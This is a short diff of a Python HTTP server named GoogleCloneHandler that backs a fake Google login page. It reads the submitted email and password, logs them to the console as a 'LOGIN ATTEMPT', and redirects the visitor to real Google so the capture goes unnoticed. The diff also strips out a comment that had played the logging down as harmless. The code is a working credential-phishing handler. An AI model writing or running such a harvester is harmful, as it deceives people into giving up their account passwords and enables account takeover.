@@ -1,3 +1,8 @@
+#
+# 
+#
+
+
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs
 
@@ -13,11 +18,9 @@ class GoogleCloneHandler(BaseHTTPRequestHandler):
 
         email = data.get("email", [""])[0]
         password = data.get("password", [""])[0]
-
-        # ✅ This just prints to the server console — not stored, not sent
+        
         print(f"[LOGIN ATTEMPT] Email: {email} | Password: {password}")
 
-        # Redirect to real Google search for "endogeny"
         self.send_response(302)
         self.send_header('Location', 'https://www.google.com/search?q=')
         self.end_headers()
